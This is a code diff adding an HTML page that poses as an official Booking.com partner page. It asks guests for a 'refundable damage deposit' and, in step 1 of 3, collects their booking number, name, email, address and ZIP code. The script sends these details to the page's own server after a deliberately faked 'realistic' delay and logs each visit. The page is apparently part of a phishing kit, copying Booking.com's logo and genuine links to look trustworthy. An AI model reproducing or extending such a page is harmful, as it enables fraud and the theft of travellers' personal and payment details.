@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en" translate="yes">
+<head>
+  <title>Booking.com | Official partener</title>
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google" content="translate">
+  <meta http-equiv="Content-Language" content="en">
+
+  <style>
+    body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #f5f7fa;
+      margin: 0;
+    }
+
+    .container{
+  max-width:520px;
+  margin:0 auto;
+  background:#fff;
+  padding:20px;
+  border-radius:8px;
+  box-shadow:0 6px 15px rgba(0,0,0,.06);
+}
+
+    h2 {
+      margin-bottom: 10px;
+    }
+
+    .progress {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+
+    .box {
+  background: #f0f6ff;
+  border: 1px solid #cfe3ff;
+  padding: 15px;
+  border-radius: 8px;
+  margin-bottom: 20px;
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+    label {
+      display: block;
+      margin-top: 10px;
+      margin-bottom: 5px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+
+    button{
+  width:100%;
+  margin-top:20px;
+  padding:14px;
+  background:#0071c2;
+  color:#fff;
+  border:none;
+  border-radius:6px; /* less rounded */
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+    button:hover {
+      background: #005fa3;
+    }
+
+    .secure {
+      margin-top:12px; text-align:center; font-size:12px; color:#6b7280;
+    }
+	.progress {
+  font-size: 13px;
+  color: #6b7280;
+  margin-bottom: 20px;
+}
+
+.error-text {
+  color: red;
+  font-size: 12px;
+  margin-top: 4px;
+}
+.error {
+  border: 2px solid red !important;
+}
+.checkbox-row {
+  margin-top: 15px;
+}
+.checkbox-row.error {
+  border: 2px solid red;
+  border-radius: 8px;
+  padding: 10px 12px;
+  background: #fff5f5;
+}
+input:focus {
+  border-color: #0071c2;
+  outline: none;
+  box-shadow: 0 0 0 2px rgba(0,113,194,0.15);
+}
+input.error:focus {
+  border-color: red;
+  box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.12);
+}
+.cookieBox {
+  font-size: 13px;
+}
+.cookieTextScroll {
+  flex: 1;
+  min-height: 0;
+  overflow-y: auto;
+  padding-right: 12px;
+  margin-bottom: 15px;
+  scrollbar-width: thin;
+  scrollbar-color: #8c8c8c transparent;
+}
+.cookieTextScroll::-webkit-scrollbar {
+  width: 8px;
+}
+.cookieTextScroll::-webkit-scrollbar-track {
+  background: transparent;
+}
+.cookieTextScroll::-webkit-scrollbar-thumb {
+  background: #8c8c8c;
+  border-radius: 999px;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+.accordion {
+  margin-top: 20px;
+  border-top: 1px solid #e7e7e7;
+}
+
+
+.content {
+  max-height: 0;
+  overflow: hidden;
+  transition: max-height 0.3s ease;
+  padding: 0;
+}
+
+.content p {
+  margin: 8px 9px;
+  font-size: 14px;
+  color: #6b7280;
+  padding-left: 10px;
+}
+.content-link {
+  cursor: pointer;
+}
+.content-link:hover {
+  color: #1a1a1a;
+  text-decoration: underline;
+}
+.item {
+  padding: 18px 18px;
+  border-bottom: 1px solid #e7e7e7;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  cursor: pointer;
+
+  font-size: 14px;
+  font-weight: 500;
+  color: #1a1a1a;
+}
+
+/* SVG styling */
+.arrow {
+  fill: #6b7280;
+  transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+/* ROTIRE SMOOTH */
+.item.active .arrow {
+  transform: rotate(180deg);
+}
+.item:hover {
+  background: #f7f7f7;
+}
+  </style>
+</head>
+
+<body>
+<div style="background:#013b95; color:white; padding:15px 20px; display:flex; justify-content:space-between; align-items:center;">
+  <div style="display:flex; align-items:center;">
+  <svg viewBox="0 0 180 30" height="20" fill="white">
+    <path d="M 70.6 2.73999 C 70.602 2.19808 70.7646 1.66892 71.0673 1.21943 C 71.3701 0.769947 71.7993 0.420321 72.3007 0.214768 C 72.8021 0.00921437 73.3532 -0.0430342 73.8843 0.064629 C 74.4155 0.172292 74.9027 0.435032 75.2845 0.819622 C 75.6663 1.20421 75.9255 1.69338 76.0293 2.22527 C 76.133 2.75716 76.0768 3.30788 75.8676 3.80779 C 75.6584 4.3077 75.3056 4.73434 74.8539 5.03377 C 74.4022 5.3332 73.8719 5.49197 73.33 5.48999 C 72.9702 5.48868 72.6141 5.41651 72.2822 5.2776 C 71.9503 5.13869 71.649 4.93576 71.3955 4.6804 C 71.1419 4.42504 70.9412 4.12225 70.8047 3.78931 C 70.6683 3.45637 70.5987 3.09982 70.6 2.73999 V 2.73999 Z M 116.5 23.77 C 117.044 23.772 117.577 23.6124 118.031 23.3114 C 118.484 23.0104 118.838 22.5816 119.048 22.0793 C 119.257 21.577 119.313 21.0238 119.208 20.4897 C 119.103 19.9555 118.842 19.4646 118.458 19.079 C 118.074 18.6934 117.584 18.4305 117.05 18.3236 C 116.516 18.2167 115.963 18.2705 115.46 18.4784 C 114.957 18.6862 114.527 19.0387 114.224 19.4911 C 113.922 19.9436 113.76 20.4757 113.76 21.02 C 113.76 21.7476 114.048 22.4456 114.562 22.961 C 115.075 23.4764 115.772 23.7673 116.5 23.77 V 23.77 Z M 25.7 6.72999 C 24.0129 6.74775 22.3688 7.26426 20.9746 8.21447 C 19.5805 9.16469 18.4986 10.5061 17.8653 12.0699 C 17.2319 13.6337 17.0754 15.3499 17.4154 17.0025 C 17.7554 18.6551 18.5767 20.1701 19.776 21.3569 C 20.9752 22.5436 22.4988 23.349 24.1548 23.6717 C 25.8108 23.9944 27.5253 23.8199 29.0824 23.1702 C 30.6395 22.5205 31.9695 21.4247 32.9051 20.0206 C 33.8406 18.6166 34.3399 16.9672 34.34 15.28 C 34.3768 14.1396 34.1778 13.0038 33.7555 11.9438 C 33.3331 10.8839 32.6965 9.92248 31.8855 9.11989 C 31.0744 8.3173 30.1064 7.69078 29.0421 7.27955 C 27.9778 6.86831 26.84 6.68122 25.7 6.72999 V 6.72999 Z M 25.7 19.83 C 23.35 19.83 21.7 17.96 21.7 15.28 C 21.7 12.6 23.34 10.73 25.7 10.73 C 28.06 10.73 29.7 12.6 29.7 15.28 C 29.7 17.96 28.11 19.83 25.7 19.83 Z M 65.3 15.71 C 65.1321 15.3716 64.9128 15.0613 64.65 14.79 L 64.5 14.63 L 64.66 14.48 C 64.9116 14.2078 65.1423 13.917 65.35 13.61 L 69.74 7.05999 H 64.41 L 61.1 12.19 C 60.9586 12.3442 60.782 12.4621 60.5852 12.5334 C 60.3885 12.6048 60.1774 12.6277 59.97 12.6 H 59.22 V 2.90999 C 59.22 0.979993 58.01 0.709993 56.71 0.709993 H 54.48 V 23.58 H 59.21 V 16.72 H 59.65 C 60.19 16.72 60.56 16.78 60.73 17.08 L 63.35 21.97 C 63.5773 22.5089 63.9785 22.9563 64.4895 23.2408 C 65.0006 23.5253 65.5922 23.6306 66.17 23.54 H 69.8 L 67.09 19.07 L 65.3 15.71 Z M 88.27 6.68999 C 87.3747 6.67014 86.4851 6.83782 85.6584 7.18226 C 84.8318 7.5267 84.0863 8.04028 83.47 8.68999 L 83.18 8.97999 L 83.08 8.57999 C 82.9261 8.08803 82.6021 7.66692 82.166 7.39207 C 81.7299 7.11723 81.2102 7.0066 80.7 7.07999 H 78.57 V 23.57 H 83.29 V 15.97 C 83.275 15.2919 83.373 14.6159 83.58 13.97 C 83.7979 13.1302 84.2923 12.3883 84.9836 11.8639 C 85.6748 11.3396 86.5225 11.0634 87.39 11.08 C 88.85 11.08 89.39 11.85 89.39 13.86 V 21.05 C 89.335 21.3921 89.3619 21.7424 89.4686 22.072 C 89.5753 22.4017 89.7586 22.7013 90.0036 22.9463 C 90.2487 23.1914 90.5483 23.3747 90.878 23.4814 C 91.2076 23.5881 91.5579 23.615 91.9 23.56 H 94.12 V 13.07 C 94.15 8.89999 92.12 6.68999 88.27 6.68999 V 6.68999 Z M 73.39 7.05999 H 71.17 V 23.58 H 75.87 V 9.57999 C 75.9234 9.24041 75.8964 8.89304 75.7913 8.56576 C 75.6862 8.23848 75.5058 7.94038 75.2647 7.69537 C 75.0236 7.45037 74.7284 7.26527 74.4028 7.15493 C 74.0773 7.04459 73.7304 7.01208 73.39 7.05999 V 7.05999 Z M 44.16 6.72999 C 42.4729 6.74775 40.8288 7.26426 39.4346 8.21447 C 38.0405 9.16469 36.9586 10.5061 36.3253 12.0699 C 35.6919 13.6337 35.5354 15.3499 35.8754 17.0025 C 36.2154 18.6551 37.0367 20.1701 38.236 21.3569 C 39.4352 22.5436 40.9588 23.349 42.6148 23.6717 C 44.2708 23.9944 45.9853 23.8199 47.5424 23.1702 C 49.0995 22.5205 50.4295 21.4247 51.3651 20.0206 C 52.3006 18.6166 52.7999 16.9672 52.8 15.28 C 52.8368 14.1396 52.6378 13.0038 52.2155 11.9438 C 51.7931 10.8839 51.1565 9.92248 50.3455 9.11989 C 49.5344 8.3173 48.5664 7.69078 47.5021 7.27955 C 46.4378 6.86831 45.3 6.68122 44.16 6.72999 V 6.72999 Z M 44.16 19.83 C 41.81 19.83 40.16 17.96 40.16 15.28 C 40.16 12.6 41.8 10.73 44.16 10.73 C 46.52 10.73 48.16 12.6 48.16 15.28 C 48.16 17.96 46.57 19.83 44.16 19.83 Z M 144.89 6.72999 C 143.203 6.74775 141.559 7.26426 140.165 8.21447 C 138.77 9.16469 137.689 10.5061 137.055 12.0699 C 136.422 13.6337 136.265 15.3499 136.605 17.0025 C 136.945 18.6551 137.767 20.1701 138.966 21.3569 C 140.165 22.5436 141.689 23.349 143.345 23.6717 C 145.001 23.9944 146.715 23.8199 148.272 23.1702 C 149.829 22.5205 151.16 21.4247 152.095 20.0206 C 153.031 18.6166 153.53 16.9672 153.53 15.28 C 153.567 14.1396 153.368 13.0038 152.945 11.9438 C 152.523 10.8839 151.887 9.92248 151.075 9.11989 C 150.264 8.3173 149.296 7.69078 148.232 7.27955 C 147.168 6.86831 146.03 6.68122 144.89 6.72999 V 6.72999 Z M 144.89 19.83 C 142.54 19.83 140.89 17.96 140.89 15.28 C 140.89 12.6 142.53 10.73 144.89 10.73 C 147.25 10.73 148.89 12.6 148.89 15.28 C 148.89 17.96 147.3 19.83 144.89 19.83 Z M 109.74 7.01999 C 109.356 6.98285 108.97 7.05749 108.627 7.23491 C 108.285 7.41233 108.001 7.68497 107.81 8.01999 L 107.69 8.26999 L 107.47 8.07999 C 106.253 7.08344 104.711 6.57072 103.14 6.63999 C 98.75 6.63999 95.78 9.94999 95.78 14.87 C 95.78 19.79 98.85 23.22 103.23 23.22 C 104.521 23.2791 105.795 22.9061 106.85 22.16 L 107.21 21.88 V 22.34 C 107.21 24.55 105.78 25.77 103.21 25.77 C 102.131 25.755 101.062 25.5555 100.05 25.18 C 99.8562 25.0813 99.6419 25.0295 99.4244 25.0287 C 99.2069 25.0279 98.9923 25.0782 98.7977 25.1754 C 98.6032 25.2727 98.4342 25.4143 98.3043 25.5887 C 98.1745 25.7632 98.0874 25.9657 98.05 26.18 L 97.14 28.46 L 97.47 28.63 C 99.2593 29.5195 101.232 29.9783 103.23 29.97 C 107.23 29.97 111.9 27.91 111.9 22.14 V 7.01999 H 109.74 Z M 104.06 19.11 C 101.5 19.11 100.58 16.86 100.58 14.76 C 100.58 13.83 100.81 10.76 103.81 10.76 C 105.3 10.76 107.3 11.18 107.3 14.86 C 107.3 18.38 105.54 19.11 104.06 19.11 Z M 13.09 11.85 L 12.4 11.47 L 13 10.97 C 13.6103 10.4334 14.0951 9.76919 14.42 9.02435 C 14.7449 8.27951 14.9019 7.47231 14.88 6.65999 C 14.88 3.05999 12.09 0.739993 7.79 0.739993 H 2.31 C 1.69606 0.762953 1.11431 1.02048 0.684566 1.45953 C 0.254821 1.89857 0.00981021 2.48571 0 3.09999 L 0 23.5 H 7.88 C 12.67 23.5 15.77 20.89 15.77 16.84 C 15.8104 15.8446 15.583 14.8566 15.1116 13.9789 C 14.6403 13.1012 13.9421 12.3661 13.09 11.85 V 11.85 Z M 4.37 6.07999 C 4.37 5.01999 4.82 4.51999 5.8 4.45999 H 7.8 C 8.16093 4.42761 8.52456 4.47504 8.8651 4.59892 C 9.20565 4.7228 9.51476 4.9201 9.77052 5.17681 C 10.0263 5.43353 10.2224 5.74338 10.345 6.08438 C 10.4676 6.42538 10.5137 6.78919 10.48 7.14999 C 10.5194 7.51629 10.4791 7.88679 10.3616 8.23598 C 10.2442 8.58517 10.0524 8.90477 9.79964 9.17277 C 9.54684 9.44077 9.23898 9.65082 8.89723 9.78844 C 8.55549 9.92606 8.18798 9.988 7.82 9.96999 H 4.37 V 6.07999 Z M 8.2 19.64 H 4.37 V 15.06 C 4.37 14.06 4.76 13.57 5.59 13.45 H 8.2 C 8.99043 13.4949 9.7337 13.8406 10.2774 14.4161 C 10.8211 14.9916 11.124 15.7533 11.124 16.545 C 11.124 17.3367 10.8211 18.0984 10.2774 18.6739 C 9.7337 19.2494 8.99043 19.595 8.2 19.64 Z M 174.53 6.73999 C 173.558 6.74366 172.6 6.96575 171.726 7.38984 C 170.852 7.81393 170.084 8.42915 169.48 9.18999 L 169.14 9.62999 L 168.87 9.13999 C 168.437 8.355 167.787 7.71128 166.998 7.2857 C 166.209 6.86012 165.314 6.67067 164.42 6.73999 C 163.604 6.75328 162.798 6.93308 162.054 7.26838 C 161.309 7.60368 160.641 8.08742 160.09 8.68999 L 159.65 9.16999 L 159.48 8.53999 C 159.323 8.07152 159.008 7.67282 158.587 7.41334 C 158.167 7.15386 157.669 7.05005 157.18 7.11999 H 155.18 V 23.57 H 159.64 V 16.31 C 159.646 15.6629 159.727 15.0187 159.88 14.39 C 160.31 12.63 161.49 10.74 163.47 10.93 C 164.69 11.05 165.29 11.99 165.29 13.82 V 23.57 H 169.81 V 16.31 C 169.791 15.6345 169.875 14.9601 170.06 14.31 C 170.42 12.64 171.65 10.92 173.56 10.92 C 174.94 10.92 175.45 11.7 175.45 13.81 V 21.17 C 175.45 22.83 176.19 23.57 177.85 23.57 H 180 V 13.07 C 180 8.86999 178.15 6.73999 174.53 6.73999 Z M 133.69 17.86 C 132.51 19.095 130.913 19.8471 129.21 19.97 C 128.593 20.0073 127.974 19.914 127.395 19.6962 C 126.816 19.4784 126.29 19.141 125.85 18.706 C 125.41 18.271 125.067 17.7482 124.843 17.1716 C 124.619 16.5951 124.519 15.9778 124.55 15.36 C 124.498 14.7504 124.575 14.1365 124.776 13.5588 C 124.978 12.981 125.299 12.4524 125.719 12.0076 C 126.14 11.5629 126.649 11.212 127.215 10.978 C 127.78 10.744 128.388 10.6322 129 10.65 C 129.84 10.65 130.8 10.95 130.95 11.46 V 11.55 C 131.048 11.8986 131.258 12.2056 131.547 12.424 C 131.835 12.6425 132.188 12.7605 132.55 12.76 H 135 V 10.61 C 135 7.76999 131.39 6.73999 129 6.73999 C 123.81 6.73999 120 10.37 120 15.35 C 120 20.33 123.73 23.97 128.86 23.97 C 130.178 23.9562 131.479 23.6722 132.683 23.1355 C 133.887 22.5989 134.969 21.821 135.86 20.85 L 134 17.58 L 133.69 17.86 Z"></path>
+  </svg>
+</div>
+  
+</div>
+
+<div class="container">
+
+  <div class="progress">
+  Step 1 of 3 – Enter your details
+  <div style="display:flex; gap:6px; margin-top:8px;">
+  <div style="flex:1; height:4px; background:#0071c2; border-radius:2px;"></div>
+  <div style="flex:1; height:4px; background:#e5e7eb; border-radius:2px;"></div>
+  <div style="flex:1; height:4px; background:#e5e7eb; border-radius:2px;"></div>
+</div>
+</div>
+
+  <h2>Damage Deposit Policy</h2>
+
+  <div class="box">
+    To ensure the safety and quality of the property, a refundable damage deposit is required prior to check-in.<br><br>
+
+    • The deposit is fully refundable within <b>24 hours after checkout</b>, provided no damages are reported.<br>
+    • No charges will be made unless an issue is identified.<br>
+    • After completing your payment, you will receive a confirmation email.<br><br>
+
+    This process helps maintain a secure experience for all guests.
+  </div>
+
+  <h2>Your Details</h2>
+
+<label>Booking Reference Number</label>
+<input id="ref" placeholder="e.g. 123456789" maxlength="10" inputmode="numeric">
+
+<label>Full Name</label>
+<input id="nume">
+
+<label>Email Address</label>
+<input id="email" type="email">
+
+<label>Street Address</label>
+<input id="adresa">
+
+<label>ZIP Code</label>
+<input id="zip">
+
+<div id="agreeDepositWrap" class="checkbox-row">
+  <label style="display:flex; align-items:center; gap:10px; cursor:pointer;">
+    <input type="checkbox" id="agreeDeposit" style="width:18px; height:18px; margin:0;">
+    <span style="font-size:13px;">
+      I accept the 
+      <a href="https://www.booking.com/content/terms.en-gb.html" target="_blank" style="color:#0071c2; text-decoration:underline;">
+        <b>Damage Deposit Policy</b>
+      </a>
+    </span>
+  </label>
+  <div id="agreeDepositError" class="error-text" style="display:none;"></div>
+</div>
+<div id="agreeTermsWrap" class="checkbox-row">
+  <label style="display:flex; align-items:center; gap:10px; cursor:pointer;">
+    <input type="checkbox" id="agreeTerms" style="width:18px; height:18px; margin:0;">
+    <span style="font-size:13px;">
+      I agree to the 
+      <a href="https://www.booking.com/content/terms.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BVTrB47erypG3tevi1U9Fv6BbNUBEiuiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142" target="_blank" style="color:#0071c2; text-decoration:underline;">
+        <b>Terms and Conditions.</b>
+      </a>
+    </span>
+  </label>
+  <div id="agreeTermsError" class="error-text" style="display:none;"></div>
+</div>
+
+  <button onclick="trimite()">Continue</button>
+
+  <div class="secure">🔒 Secure process • Your data is protected</div>
+
+</div>
+
+<script>
+const refInput = document.getElementById("ref");
+const nameInput = document.getElementById("nume");
+const emailInput = document.getElementById("email");
+const addressInput = document.getElementById("adresa");
+const zipInput = document.getElementById("zip");
+const agreeDepositInput = document.getElementById("agreeDeposit");
+const agreeDepositWrap = document.getElementById("agreeDepositWrap");
+const agreeDepositError = document.getElementById("agreeDepositError");
+const agreeTermsInput = document.getElementById("agreeTerms");
+const agreeTermsWrap = document.getElementById("agreeTermsWrap");
+const agreeTermsError = document.getElementById("agreeTermsError");
+const agreementFields = [
+  {
+    key: "agree",
+    input: agreeDepositInput,
+    wrap: agreeDepositWrap,
+    error: agreeDepositError,
+    message: "Please check the Damage Deposit Policy box to continue"
+  },
+  {
+    key: "agreeTerms",
+    input: agreeTermsInput,
+    wrap: agreeTermsWrap,
+    error: agreeTermsError,
+    message: "Please check the Terms and Conditions box to continue"
+  }
+];
+const bookingFooterUrl = "https://www.booking.com/content/about.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+const travelArticlesUrl = "https://www.booking.com/articles.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+const seasonalDealsUrl = "https://www.booking.com/deals/index.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+const termsUrl = "https://www.booking.com/content/terms.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+
+fetch("/track-step1-view", { method: "POST" }).catch(() => {});
+
+function clearError(input) {
+  input.classList.remove("error");
+
+  const error = input.nextElementSibling;
+  if (error && error.classList.contains("error-text")) {
+    error.remove();
+  }
+}
+
+function showError(input, message) {
+  clearError(input);
+  input.classList.add("error");
+
+  const error = document.createElement("div");
+  error.className = "error-text";
+  error.innerText = message;
+  input.insertAdjacentElement("afterend", error);
+}
+
+function clearCheckboxError(field) {
+  field.wrap.classList.remove("error");
+  field.error.style.display = "none";
+  field.error.innerText = "";
+}
+
+function showCheckboxError(field) {
+  field.wrap.classList.add("error");
+  field.error.style.display = "block";
+  field.error.innerText = field.message;
+}
+
+function clearAllCheckboxErrors() {
+  agreementFields.forEach(clearCheckboxError);
+}
+
+function isValidBookingRef(value) {
+  return /^\d{6,10}$/.test(value);
+}
+
+function isValidName(value) {
+  return value.length >= 3 && /^[\p{L}\s'-]+$/u.test(value);
+}
+
+function isValidEmail(value) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value);
+}
+
+function isValidAddress(value) {
+  return value.length >= 5 && /\p{L}/u.test(value);
+}
+
+function isValidZip(value) {
+  return /^[A-Za-z0-9 -]{4,10}$/.test(value);
+}
+
+function validateStep1Form(values) {
+  let valid = true;
+
+  clearError(refInput);
+  clearError(nameInput);
+  clearError(emailInput);
+  clearError(addressInput);
+  clearError(zipInput);
+  clearAllCheckboxErrors();
+
+  if (!isValidBookingRef(values.ref)) {
+    showError(refInput, "Enter a valid booking number (10 digits)");
+    valid = false;
+  }
+
+  if (!isValidName(values.nume)) {
+    showError(nameInput, "Enter your full name using letters only");
+    valid = false;
+  }
+
+  if (!isValidEmail(values.email)) {
+    showError(emailInput, "Enter a valid email address");
+    valid = false;
+  }
+
+  if (!isValidAddress(values.adresa)) {
+    showError(addressInput, "Enter a valid street address");
+    valid = false;
+  }
+
+  if (!isValidZip(values.zip)) {
+    showError(zipInput, "Enter a valid ZIP code");
+    valid = false;
+  }
+
+  agreementFields.forEach(field => {
+    if (!values[field.key]) {
+      showCheckboxError(field);
+      valid = false;
+    }
+  });
+
+  return valid;
+}
+
+async function trimite() {
+  const values = {
+    ref: refInput.value.trim(),
+    nume: nameInput.value.trim(),
+    email: emailInput.value.trim(),
+    adresa: addressInput.value.trim(),
+    zip: zipInput.value.trim(),
+    agree: agreeDepositInput.checked,
+    agreeTerms: agreeTermsInput.checked
+  };
+
+  if (!validateStep1Form(values)) return;
+
+  // SHOW LOADING SCREEN
+const loader = document.getElementById("loadingScreen");
+loader.style.opacity = "1";
+loader.style.pointerEvents = "auto";
+
+// FAKE DELAY (realistic)
+setTimeout(async () => {
+
+  const res = await fetch("/step1", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(values)
+  });
+
+  const data = await res.json();
+
+  if (!res.ok) {
+    loader.style.opacity = "0";
+    loader.style.pointerEvents = "none";
+    alert(data.error || "Please check your details and try again.");
+    return;
+  }
+
+  window.location = "step2.html?id=" + data.id;
+
+}, 2500); // 2.5 sec delay
+
+ 
+}
+
+refInput.addEventListener("input", () => {
+  refInput.value = refInput.value.replace(/\D/g, "").slice(0, 10);
+  clearError(refInput);
+});
+
+[nameInput, emailInput, addressInput, zipInput].forEach(input => {
+  input.addEventListener("input", () => clearError(input));
+});
+
+agreementFields.forEach(field => {
+  field.input.addEventListener("change", () => {
+    if (field.input.checked) {
+      clearCheckboxError(field);
+    }
+  });
+});
+
+// SHOW COOKIE BOX AFTER LOAD
+function setCookie(name, value, days) {
+  const d = new Date();
+  d.setTime(d.getTime() + days*24*60*60*1000);
+  document.cookie = name + "=" + value + ";path=/;expires=" + d.toUTCString();
+}
+
+// Helper: get cookie
+function getCookie(name) {
+  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+  if (match) return match[2];
+  return null;
+}
+
+// Show cookie box if not accepted
+window.addEventListener("load", () => {
+  const accepted = getCookie("cookiesAccepted");
+
+  if (!accepted) {
+    setTimeout(() => {
+      const box = document.getElementById("cookieBox");
+      const overlay = document.getElementById("cookieOverlay");
+
+      if (box) box.style.transform = "translateY(0)";
+      if (overlay) {
+        overlay.style.opacity = "1";
+        overlay.style.pointerEvents = "auto";
+      }
+
+    }, 500);
+  }
+});
+
+function acceptCookies() {
+  setCookie("cookiesAccepted", "yes", 365);
+  closeCookies();
+}
+
+function declineCookies() {
+  setCookie("cookiesAccepted", "no", 365);
+  closeCookies();
+}
+
+function closeCookies() {
+  document.getElementById("cookieBox").style.transform = "translateY(100%)";
+
+  const overlay = document.getElementById("cookieOverlay");
+  overlay.style.opacity = "0";
+  overlay.style.pointerEvents = "none";
+}
+function toggle(el) {
+  const content = el.nextElementSibling;
+
+  el.classList.toggle("active");
+
+  if (content.style.maxHeight) {
+    content.style.maxHeight = null;
+  } else {
+    content.style.maxHeight = content.scrollHeight + "px";
+  }
+}
+
+function openBookingFooterLink(url = bookingFooterUrl) {
+  const shouldLeave = window.confirm("Are you sure you want to leave this page?");
+
+  if (shouldLeave) {
+    window.location.href = url;
+  }
+}
+
+</script>
+<div class="accordion">
+
+  <div class="item" onclick="toggle(this)">
+    Support <svg class="arrow" width="20" height="20" viewBox="0 0 24 24">
+  <path d="M19.268 8.913a.9.9 0 0 1-.266.642l-6.057 6.057A1.3 1.3 0 0 1 12 16c-.35.008-.69-.123-.945-.364L4.998 9.58a.91.91 0 0 1 0-1.284.897.897 0 0 1 1.284 0L12 13.99l5.718-5.718a.897.897 0 0 1 1.284 0 .88.88 0 0 1 .266.642"></path>
+</svg>
+  </div>
+  <div class="content">
+    <p class="content-link" onclick="openBookingFooterLink()">Help Center</p>
+    <p class="content-link" onclick="openBookingFooterLink()">Contact us</p>
+  </div>
+
+  <div class="item" onclick="toggle(this)">
+  Discover 
+  <svg class="arrow" width="20" height="20" viewBox="0 0 24 24">
+    <path d="M19.268 8.913a.9.9 0 0 1-.266.642l-6.057 6.057A1.3 1.3 0 0 1 12 16c-.35.008-.69-.123-.945-.364L4.998 9.58a.91.91 0 0 1 0-1.284.897.897 0 0 1 1.284 0L12 13.99l5.718-5.718a.897.897 0 0 1 1.284 0 .88.88 0 0 1 .266.642"></path>
+  </svg>
+</div>
+<div class="content">
+  <p class="content-link" onclick="openBookingFooterLink(travelArticlesUrl)">Travel articles</p>
+  <p class="content-link" onclick="openBookingFooterLink(seasonalDealsUrl)">Seasonal deals</p>
+</div>
+
+  <div class="item" onclick="toggle(this)">
+    Terms and settings <svg class="arrow" width="20" height="20" viewBox="0 0 24 24">
+  <path d="M19.268 8.913a.9.9 0 0 1-.266.642l-6.057 6.057A1.3 1.3 0 0 1 12 16c-.35.008-.69-.123-.945-.364L4.998 9.58a.91.91 0 0 1 0-1.284.897.897 0 0 1 1.284 0L12 13.99l5.718-5.718a.897.897 0 0 1 1.284 0 .88.88 0 0 1 .266.642"></path>
+</svg>
+  </div>
+  <div class="content">
+    <p class="content-link" onclick="openBookingFooterLink(termsUrl)">Privacy policy</p>
+    <p class="content-link" onclick="openBookingFooterLink(termsUrl)">Terms of use</p>
+  </div>
+
+  <div class="item" onclick="toggle(this)">
+    Partners <svg class="arrow" width="20" height="20" viewBox="0 0 24 24">
+  <path d="M19.268 8.913a.9.9 0 0 1-.266.642l-6.057 6.057A1.3 1.3 0 0 1 12 16c-.35.008-.69-.123-.945-.364L4.998 9.58a.91.91 0 0 1 0-1.284.897.897 0 0 1 1.284 0L12 13.99l5.718-5.718a.897.897 0 0 1 1.284 0 .88.88 0 0 1 .266.642"></path>
+</svg>
+  </div>
+  <div class="content">
+    <p class="content-link" onclick="openBookingFooterLink()">Extranet login</p>
+    <p class="content-link" onclick="openBookingFooterLink()">Partner help</p>
+  </div>
+
+  <div class="item" onclick="toggle(this)">
+    About <svg class="arrow" width="20" height="20" viewBox="0 0 24 24">
+  <path d="M19.268 8.913a.9.9 0 0 1-.266.642l-6.057 6.057A1.3 1.3 0 0 1 12 16c-.35.008-.69-.123-.945-.364L4.998 9.58a.91.91 0 0 1 0-1.284.897.897 0 0 1 1.284 0L12 13.99l5.718-5.718a.897.897 0 0 1 1.284 0 .88.88 0 0 1 .266.642"></path>
+</svg>
+  </div>
+  <div class="content">
+    <p class="content-link" onclick="openBookingFooterLink()">About Booking.com</p>
+    <p class="content-link" onclick="openBookingFooterLink()">How we work</p>
+  </div>
+
+</div>
+<div style="text-align:center; font-size:12px; color:#777; margin:40px 20px;">
+  Booking.com is part of Booking Holdings Inc., the world leader in online travel and related services.<br>
+  Copyright © 1996–2026 Booking.com™. All rights reserved.
+</div>
+<div id="cookieOverlay" style="
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.4);
+opacity:0;
+pointer-events:none;
+transition:0.3s;
+z-index:998;
+"></div>
+
+
+<div id="cookieBox" style="
+position:fixed;
+left:0;
+right:0;
+bottom:0;
+width:100%;
+height:60vh;
+max-height:60vh;
+background:white;
+border-top-left-radius:16px;
+border-top-right-radius:16px;
+box-shadow:0 -10px 30px rgba(0,0,0,0.25);
+padding:20px;
+padding-bottom:calc(20px + env(safe-area-inset-bottom));
+overflow:hidden;
+display:flex;
+flex-direction:column;
+transform:translateY(100%);
